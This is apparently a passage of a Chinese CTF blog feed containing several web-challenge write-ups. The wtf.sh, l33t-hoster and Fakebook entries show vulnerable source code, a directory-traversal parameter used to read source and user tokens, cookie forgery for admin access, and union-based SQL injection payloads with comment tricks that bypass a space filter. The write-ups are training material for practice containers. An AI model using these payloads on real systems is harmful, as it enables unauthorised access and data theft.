class="line">    sys.exit(__main__._main())</span><br></pre></td></tr></table></figure><p><strong>pip 太慢建议换源</strong></p><ul><li>临时换源</li></ul><blockquote><p><code>pip install -i https://pypi.tuna.tsinghua.edu.cn/simple [package name]</code></p></blockquote><ul><li>永久换源</li></ul><blockquote><p>新建 ~/.pip/pip.conf 文件，写入如下内容</p></blockquote><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[global]</span></span><br><span class="line"><span class="attr">index-url</span> = https://pypi.tuna.tsinghua.edu.cn/simple</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Web 狗一只，最近打 ctf 愈发觉得 pwn 的重要，于是便有了当爷爷的冲动！&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;JOJO！我不当狗了！&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://rfpzqq.sn.files.1drv.com/y4mvd9Oip3PylZBMV4Xe_0HLpqIn7_YtZjHrhKlGj3ceUGUNrd-x-Zg2A4FCIPyBPMbP5YDn6VNLxeGWKJVLUvrba6z6Klt5C6rUO-D31dORpAorrjVfSpIJgNcqVPnaTuYYjLXMU8N856NoR1arCntzcKq9lI2E2u36RalGPSx-U4LnDA2DezfM_duYfHLRwSAjxb6l6MLriBezCrRBX0kSA?width=700&amp;height=350&amp;cropmode=none&quot; alt&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="pwn" scheme="http://AbelChe.com/categories/pwn/"/>
    
    
      <category term="pwn入门" scheme="http://AbelChe.com/tags/pwn%E5%85%A5%E9%97%A8/"/>
    
  </entry>
  
  <entry>
    <title>WP-CSAW CTF Qualification Round 2016 wtf.sh</title>
    <link href="http://AbelChe.com/2019/08/22/Writeup/WP-CSAW-CTF-Qualification-Round-2016-wtf-sh/"/>
    <id>http://AbelChe.com/2019/08/22/Writeup/WP-CSAW-CTF-Qualification-Round-2016-wtf-sh/</id>
    <published>2019-08-22T10:00:33.000Z</published>
    <updated>2019-10-14T08:12:47.440Z</updated>
    
    <content type="html"><![CDATA[<p>在XCTF上刷题，刷到了这道神仙题，顺着别人的wp做了一遍</p><h1 id="第一部分-flag"><a href="#第一部分-flag" class="headerlink" title="第一部分 flag"></a>第一部分 flag</h1><p><img src="https://tnekvq.sn.files.1drv.com/y4mj9aRWimSeLPR569d0TDjc5XW_7l_P3BCzO8g6odRTrXcWVcCGd3_h1PzGebj9N6_Jwt9H-UH_mjvAysyo7Oh9YuFlg5j964ecINwfT8udKY5GMmw5k4GIEzWg5cd4E9dIlHJAOw1WXAKbEnDPTqjvK1VqjdA4MTQKL9jGhp6FHq4_nMsDImZkVKm_ls1n-eRPX3Gx-MqSi8R8pdjeYorpg?width=1044&height=472&cropmode=none" alt></p><p>首先能看到这是一个有注册，登录的功能基本齐全的论坛系统</p><h2 id="找源码"><a href="#找源码" class="headerlink" title="找源码"></a>找源码</h2><p>随便点一个文章链接，可以看到是通过参数<code>post</code>选择文章的</p><p><img src="https://tnejvq.sn.files.1drv.com/y4mTD1IGSEi0da08UlfcL-bH5hkYBveDGwt2eoFSZbRov921-MsCesX-P3M1iApDbjtGKCheMf86zXBPU5tHQNBj0PX962m4ZmqfN3gMooagLtJi6zlDzrOnWH-EGALYAsBVdGZxnMu_v6PAW6kwXrD-Bp1EX0_latd2LxYyKJZAH4AvaBnU0VZYBOhM6PvbyS6hf-Yq9ygvOrjWgwZpKSVRw?width=644&height=140&cropmode=none" alt></p><p>在<code>post</code>参数身上进行测试，程序对<code>post</code>的值过滤不严，有目录穿越漏洞，访问<code>post.wtf?post=../</code>能够读取到源码</p><p><img src="https://tnewvq.sn.files.1drv.com/y4m71QcRTrxqArk8FRd6Hscd5GflS_1xjJxc2aen9jgVW1XoHFZ4vg4DX2QkN3ZQWRH0H4naJhnmcb8NmxocfjVtXiVnPJc21yCpLNgcCMkXx0tgkBeyYBL6nB1oDMbpjXTeEBdddXGGCxiCYW9wi35lUznH2ylo4brMFlFFv2NCb7U9CVmDL09WPHRquLBTu2cp1AZrKdQG2vk7iWjGdjbVg?width=1044&height=755&cropmode=none" alt></p><p>明显这不是一个常见的 php, python, java, go 等语言的 web 应用。结合题目wtf.sh, 这是一个shell脚本跑起来的web应用</p><p>搜索flag找到如下代码</p><p><img src="https://tnevvq.sn.files.1drv.com/y4m16PeAP-_6_woZPDYdgC9v5-CSTHebCb1GxkAehZW73XUyNwrFhEFkCrw09zpIzTDe4ajyc7e1TXkpF2v7GrRnJ_oZvqTSkx7VUYpyylVRlkqYRP7IUk5wtlG2Kw_nChTdSRCqfPPdMAuCWhXOOl_9NbNc0f1L5pff15KdExuhKADZqlMp7gjBmfwUiUxb9VtwyI538P4hjAtT4zoYSlvWw?width=1117&height=416&cropmode=none" alt></p><p>html解码下得到如下代码:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="comment"># vim: ft=wtf</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">source</span> user_functions.sh</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;link rel="stylesheet" type="text/css" href="/css/std.css" &gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="keyword">if</span> contains <span class="string">'user'</span> <span class="variable">$&#123;!URL_PARAMS[@]&#125;</span> &amp;&amp; file_exists <span class="string">"users/<span class="variable">$&#123;URL_PARAMS['user']&#125;</span>"</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="keyword">then</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash">   <span class="built_in">local</span> username=$(head -n 1 users/<span class="variable">$&#123;URL_PARAMS['user']&#125;</span>);</span></span><br><span class="line"><span class="meta">$</span><span class="bash">   <span class="built_in">echo</span> <span class="string">"&lt;h3&gt;<span class="variable">$&#123;username&#125;</span>'s posts:&lt;/h3&gt;"</span>;</span></span><br><span class="line"><span class="meta">$</span><span class="bash">   <span class="built_in">echo</span> <span class="string">"&lt;ol&gt;"</span>;</span></span><br><span class="line"><span class="meta">$</span><span class="bash">   get_users_posts <span class="string">"<span class="variable">$&#123;username&#125;</span>"</span> | <span class="keyword">while</span> <span class="built_in">read</span> -r post; <span class="keyword">do</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash">       post_slug=$(awk -F/ <span class="string">'&#123;print $2 "#" $3&#125;'</span> &lt;&lt;&lt; <span class="string">"<span class="variable">$&#123;post&#125;</span>"</span>);</span></span><br><span class="line"><span class="meta">$</span><span class="bash">       <span class="built_in">echo</span> <span class="string">"&lt;li&gt;&lt;a href=\"/post.wtf?post=<span class="variable">$&#123;post_slug&#125;</span>\"&gt;<span class="variable">$(nth_line 2 "$&#123;post&#125;" | htmlentities)</span>&lt;/a&gt;&lt;/li&gt;"</span>;</span></span><br><span class="line"><span class="meta">$</span><span class="bash">   <span class="keyword">done</span> </span></span><br><span class="line"><span class="meta">$</span><span class="bash">   <span class="built_in">echo</span> <span class="string">"&lt;/ol&gt;"</span>;</span></span><br><span class="line"><span class="meta">$</span><span class="bash">   <span class="keyword">if</span> is_logged_in &amp;&amp; [[ <span class="string">"<span class="variable">$&#123;COOKIES['USERNAME']&#125;</span>"</span> = <span class="string">'admin'</span> ]] &amp;&amp; [[ <span class="variable">$&#123;username&#125;</span> = <span class="string">'admin'</span> ]]</span></span><br><span class="line"><span class="meta">$</span><span class="bash">   <span class="keyword">then</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash">       get_flag1</span></span><br><span class="line"><span class="meta">$</span><span class="bash">   <span class="keyword">fi</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="keyword">fi</span></span></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>发现只要以admin身份登录就能够得到flag1</p><h2 id="以admin身份登录"><a href="#以admin身份登录" class="headerlink" title="以admin身份登录"></a>以admin身份登录</h2><p>继续扫目录，发现<code>?post=../users</code>目录下存放了user的token和加密的密码</p><p><img src="https://txeevq.sn.files.1drv.com/y4m-vmlSSl2kBoJcSiVroQD5BLlSql_A5TyWKn-kzPIu72SoWhW4f-_M9tAvHL64TQ-B31bSgcSxRngV2rLUh0Ha6QatXw-_rfLKK106n3C582kBswbHHzOihTjMLltSjraJsFv-8yWxyqIZ-vP6vopIgRcDXejiM3sR51M_csPHH09CjZ8Ls2EUBwK_r35UX8g8YL7ASuhEgMqEiV2zb3OhA?width=1846&height=839&cropmode=none" alt></p><p>修改 COOKIE 为 admin 的信息，得到第一部分 flag</p><p><img src="https://qdrzta.sn.files.1drv.com/y4mJ4NNSqk7HwuFE7tQLWz0vQdQQLbrSljNlMvnreUrwRZRZcvAdlYHoTfBTUD7FajMxoTks0AXbrjc7C9wAi9-vlypvYYmzOwX0Bs-uZhle4TLsSC9GmencUD14MOOaZsTGyY1SVedgNNEl5lbJbnvs-gEyVYMfaXrRUX5pcIJ9WQRiJEjXxOontojdnzKorx7NHHejh1y7pg0xbuKSeM5OQ?width=1777&height=1019&cropmode=none" alt></p><h1 id="第二部分-flag"><a href="#第二部分-flag" class="headerlink" title="第二部分 flag"></a>第二部分 flag</h1>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在XCTF上刷题，刷到了这道神仙题，顺着别人的wp做了一遍&lt;/p&gt;
&lt;h1 id=&quot;第一部分-flag&quot;&gt;&lt;a href=&quot;#第一部分-flag&quot; class=&quot;headerlink&quot; title=&quot;第一部分 flag&quot;&gt;&lt;/a&gt;第一部分 flag&lt;/h1&gt;&lt;p&gt;&lt;img 
      
    
    </summary>
    
      <category term="WriteUp" scheme="http://AbelChe.com/categories/WriteUp/"/>
    
    
      <category term="神仙题" scheme="http://AbelChe.com/tags/%E7%A5%9E%E4%BB%99%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>WP-2019 强网杯 Web</title>
    <link href="http://AbelChe.com/2019/08/01/Writeup/WP-2019-%E5%BC%BA%E7%BD%91%E6%9D%AF-Web/"/>
    <id>http://AbelChe.com/2019/08/01/Writeup/WP-2019-强网杯-Web/</id>
    <published>2019-08-01T06:51:44.000Z</published>
    <updated>2019-08-04T12:15:30.760Z</updated>
    
    <content type="html"><![CDATA[<h1 id="supersqli"><a href="#supersqli" class="headerlink" title="supersqli"></a>supersqli</h1><h2 id="题目复现"><a href="#题目复现" class="headerlink" title="题目复现"></a>题目复现</h2><p><a href="https://github.com/CTFTraining/qwb_2019_supersqli/tree/0787e6a8273a78a8b237b08c034851f47cf20d6c" target="_blank" rel="noopener">https://github.com/CTFTraining/qwb_2019_supersqli/tree/0787e6a8273a78a8b237b08c034851f47cf20d6c</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/CTFTraining/qwb_2019_supersqli.git</span><br><span class="line"><span class="built_in">cd</span> qwb_2019_supersqli/</span><br><span class="line">docker-compose up -d</span><br><span class="line">docker run -d -p 1000:80 ctftraining/qwb_2019_supersqli</span><br></pre></td></tr></table></figure><h2 id="题目解析"><a href="#题目解析" class="headerlink" title="题目解析"></a>题目解析</h2><p>打开题目看到输入框，还有提示</p><p>### </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;supersqli&quot;&gt;&lt;a href=&quot;#supersqli&quot; class=&quot;headerlink&quot; title=&quot;supersqli&quot;&gt;&lt;/a&gt;supersqli&lt;/h1&gt;&lt;h2 id=&quot;题目复现&quot;&gt;&lt;a href=&quot;#题目复现&quot; class=&quot;headerli
      
    
    </summary>
    
      <category term="WriteUp" scheme="http://AbelChe.com/categories/WriteUp/"/>
    
    
      <category term="web" scheme="http://AbelChe.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>WP-Insomni hacker&#39;s Teaser 2019 l33t-hoster</title>
    <link href="http://AbelChe.com/2019/07/30/Writeup/WP-Insomni-hacker-s-Teaser-2019-l33t-hoster/"/>
    <id>http://AbelChe.com/2019/07/30/Writeup/WP-Insomni-hacker-s-Teaser-2019-l33t-hoster/</id>
    <published>2019-07-30T09:09:20.000Z</published>
    <updated>2019-08-03T10:19:43.340Z</updated>
    
    <content type="html"><![CDATA[<h1 id="题目复现"><a href="#题目复现" class="headerlink" title="题目复现"></a>题目复现</h1><p><a href="https://github.com/Tiaonmmn/insomniteaser_2019_l33t_hoster" target="_blank" rel="noopener">https://github.com/Tiaonmmn/insomniteaser_2019_l33t_hoster</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/Tiaonmmn/insomniteaser_2019_l33t_hoster.git</span><br><span class="line"><span class="built_in">cd</span> insomniteaser_2019_l33t_hoster/</span><br><span class="line">docker-compose up -d</span><br><span class="line">docker run -d -p 1000:80 insomniteaser_2019_l33t_hoster:latest</span><br></pre></td></tr></table></figure><p>访问 http://[Your IP]:1000 即可</p><a id="more"></a><h1 id="题目解析"><a href="#题目解析" class="headerlink" title="题目解析"></a>题目解析</h1><p>查看源码获得提示，访问 /?source 得到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">"source"</span>])) </span><br><span class="line">    <span class="keyword">die</span>(highlight_file(<span class="keyword">__FILE__</span>));</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">"home"</span>])) &#123;</span><br><span class="line">    $_SESSION[<span class="string">"home"</span>] = bin2hex(random_bytes(<span class="number">20</span>));</span><br><span class="line">&#125;</span><br><span class="line">$userdir = <span class="string">"images/&#123;$_SESSION["</span>home<span class="string">"]&#125;/"</span>;</span><br><span class="line"><span class="keyword">if</span> (!file_exists($userdir)) &#123;</span><br><span class="line">    mkdir($userdir);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$disallowed_ext = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">"php"</span>,</span><br><span class="line">    <span class="string">"php3"</span>,</span><br><span class="line">    <span class="string">"php4"</span>,</span><br><span class="line">    <span class="string">"php5"</span>,</span><br><span class="line">    <span class="string">"php7"</span>,</span><br><span class="line">    <span class="string">"pht"</span>,</span><br><span class="line">    <span class="string">"phtm"</span>,</span><br><span class="line">    <span class="string">"phtml"</span>,</span><br><span class="line">    <span class="string">"phar"</span>,</span><br><span class="line">    <span class="string">"phps"</span>,</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">"upload"</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($_FILES[<span class="string">'image'</span>][<span class="string">'error'</span>] !== UPLOAD_ERR_OK) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"yuuuge fail"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $tmp_name = $_FILES[<span class="string">"image"</span>][<span class="string">"tmp_name"</span>];</span><br><span class="line">    $name = $_FILES[<span class="string">"image"</span>][<span class="string">"name"</span>];</span><br><span class="line">    $parts = explode(<span class="string">"."</span>, $name);</span><br><span class="line">    $ext = array_pop($parts);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($parts[<span class="number">0</span>])) &#123;</span><br><span class="line">        array_shift($parts);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (count($parts) === <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"lol filename is empty"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (in_array($ext, $disallowed_ext, <span class="keyword">TRUE</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"lol nice try, but im not stupid dude..."</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $image = file_get_contents($tmp_name);</span><br><span class="line">    <span class="keyword">if</span> (mb_strpos($image, <span class="string">"&lt;?"</span>) !== <span class="keyword">FALSE</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"why would you need php in a pic....."</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!exif_imagetype($tmp_name)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"not an image."</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $image_size = getimagesize($tmp_name);</span><br><span class="line">    <span class="keyword">if</span> ($image_size[<span class="number">0</span>] !== <span class="number">1337</span> || $image_size[<span class="number">1</span>] !== <span class="number">1337</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"lol noob, your pic is not l33t enough"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $name = implode(<span class="string">"."</span>, $parts);</span><br><span class="line">    move_uploaded_file($tmp_name, $userdir . $name . <span class="string">"."</span> . $ext);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h3&gt;Your &lt;a href=$userdir&gt;files&lt;/a&gt;:&lt;/h3&gt;&lt;ul&gt;"</span>;</span><br><span class="line"><span class="keyword">foreach</span>(glob($userdir . <span class="string">"*"</span>) <span class="keyword">as</span> $file) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;li&gt;&lt;a href='$file'&gt;$file&lt;/a&gt;&lt;/li&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/ul&gt;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;题目复现&quot;&gt;&lt;a href=&quot;#题目复现&quot; class=&quot;headerlink&quot; title=&quot;题目复现&quot;&gt;&lt;/a&gt;题目复现&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/Tiaonmmn/insomniteaser_2019_l33t_hoster&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://github.com/Tiaonmmn/insomniteaser_2019_l33t_hoster&lt;/a&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;git &lt;span class=&quot;built_in&quot;&gt;clone&lt;/span&gt; https://github.com/Tiaonmmn/insomniteaser_2019_l33t_hoster.git&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;cd&lt;/span&gt; insomniteaser_2019_l33t_hoster/&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;docker-compose up -d&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;docker run -d -p 1000:80 insomniteaser_2019_l33t_hoster:latest&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;访问 http://[Your IP]:1000 即可&lt;/p&gt;
    
    </summary>
    
      <category term="WriteUp" scheme="http://AbelChe.com/categories/WriteUp/"/>
    
    
      <category term="php" scheme="http://AbelChe.com/tags/php/"/>
    
      <category term="文件上传" scheme="http://AbelChe.com/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
      <category term=".htaccess" scheme="http://AbelChe.com/tags/htaccess/"/>
    
  </entry>
  
  <entry>
    <title>WP-网鼎杯 2018 Fakebook</title>
    <link href="http://AbelChe.com/2019/07/29/Writeup/WP-%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Fakebook/"/>
    <id>http://AbelChe.com/2019/07/29/Writeup/WP-网鼎杯-2018-Fakebook/</id>
    <published>2019-07-29T07:32:48.000Z</published>
    <updated>2019-08-15T11:02:02.458Z</updated>
    
    <content type="html"><![CDATA[<h1 id="题目复现"><a href="#题目复现" class="headerlink" title="题目复现"></a>题目复现</h1><p><a href="https://github.com/CTFTraining/wdb_2018_fakebook/tree/0de336f09a15dee090d6a001a5a29e60e647be8a" target="_blank" rel="noopener">https://github.com/CTFTraining/wdb_2018_fakebook/tree/0de336f09a15dee090d6a001a5a29e60e647be8a</a></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/CTFTraining/wdb_2018_fakebook.git</span><br><span class="line"><span class="built_in">cd</span> wdb_2018_fakebook/</span><br><span class="line">docker-compose up -d</span><br><span class="line">docker run -d -p 1000:80 ctftraining/wdb_2018_fakebook</span><br></pre></td></tr></table></figure><p>访问 http://[your ip]:1000/ 即可</p><a id="more"></a><h1 id="题目解析"><a href="#题目解析" class="headerlink" title="题目解析"></a>题目解析</h1><p>题目是一个分享 blog 网址的站</p><p>正常注册一个账号</p><p>首页上会展示刚才注册的信息，点击用户名会跳转到view.php</p><p>在这个页面上展示了username, age, blog 和一个iframe引入的用户填写的blog网址</p><p><img src="https://wjpdpw.sn.files.1drv.com/y4mKkgmNpq17f1m8owIrZrf2we4uLX4JCWgA1Nf_BjC7NaxTv0MjJ0a8imLMueid2gD35_Dyb58WyZ1r17JCUX3Q4K97jX69lQTCFoawKJZXY6PvMgdTQrgetx2Gpi8n0mNi3wzT6xBz-SRdrElYtcVbqILez-I1vw20gGdX7zUoYXEL0Q8SRYsVCYVHWfHJbmFNqZi5AyGm1lYof_BWOwxCA?width=1911&height=947&cropmode=none" alt></p><p>而且注意到view.php是通过 id 值来查找用户的，那么可能会有sql注入</p><p>在页面上引入 blog 是用户可控的，那么很有可能会存在 SSRF </p><h2 id="扫下后台"><a href="#扫下后台" class="headerlink" title="扫下后台"></a>扫下后台</h2><ul><li>得到robots.txt 如下</li></ul><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">User</span>-agent: *</span><br><span class="line">Disallow: /<span class="keyword">user</span>.php.bak</span><br></pre></td></tr></table></figure><ul><li>又得到了一份源码</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">public</span> $age = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> $blog = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name, $age, $blog)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = (int)$age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blog = $blog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($url)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $ch = curl_init();</span><br><span class="line"></span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        $output = curl_exec($ch);</span><br><span class="line">        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>($httpCode == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close($ch);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $output;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> <span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="keyword">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> <span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $blog = <span class="keyword">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> preg_match(<span class="string">"/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i"</span>, $blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>访问flag.php正常200</li></ul><h2 id="在view-php-id处sql注入"><a href="#在view-php-id处sql注入" class="headerlink" title="在view.php?id处sql注入"></a>在view.php?id处sql注入</h2><p>测试后发现此处对空格进行了过滤，用注释/**/绕过下</p><p>order by测试查询的字段数为4</p><p>常规查表，列，字段</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-1/**/union/**/select/**/1,group_concat(table_name),3,4 <span class="keyword">from</span> information_schema.tables where <span class="attribute">table_schema</span>=database()#</span><br><span 